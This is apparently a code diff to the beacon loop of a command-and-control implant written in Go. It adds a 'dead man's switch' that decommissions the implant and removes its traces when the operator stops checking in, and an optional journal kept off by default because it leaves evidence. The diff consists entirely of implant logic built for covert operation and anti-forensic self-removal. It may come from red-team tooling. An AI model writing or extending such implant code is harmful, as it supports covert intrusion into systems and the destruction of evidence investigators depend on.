@@ -125,6 +125,14 @@ func (b *Beacon) Run(ctx context.Context) error {
 		if b.stop {
 			return nil
 		}
+		// The dead man's switch: the operator stopped checking in, so the
+		// implant takes its traces with it and leaves.  An implant that
+		// outlives its engagement is an implant nobody watches.
+		if forensicDeadmanFired() {
+			b.logf("the dead man's switch fired: the operator went quiet")
+			b.taskDecommission(map[string]any{})
+			return nil
+		}
 		keep, err := b.cycle(ctx)
 		if b.stop {
 			return nil
@@ -172,6 +180,14 @@ func (b *Beacon) cycle(ctx context.Context) (bool, error) {
 	}
 	sess := hs.Session
 	b.logf("registered as %s", b.cfg.ID)
+	// The journal of the engagement is a trace of its own, so it is
+	// written only while the operator asks for it.
+	if forensicJournalEnabled() {
+		forensicJournalAppend("handshake", "the session with the server is open")
+	}
+	// Every check-in of the operator is a proof that the engagement is
+	// alive, so the dead man's switch renews its window.
+	forensicDeadmanRenew()
 
 	// The check-in: the server answers with the batch of the work.
 	checkin := map[string]any{
@@ -227,6 +243,9 @@ func (b *Beacon) cycle(ctx context.Context) (bool, error) {
 			continue
 		}
 		b.logf("task %s kind=%s", id, kind)
+		if forensicJournalEnabled() {
+			forensicJournalAppend("task", kind)
+		}
 		outcome := b.runTask(kind, args)
 		if err := b.sendResult(conn, sess, id, &outcome); err != nil {
 			return false, err
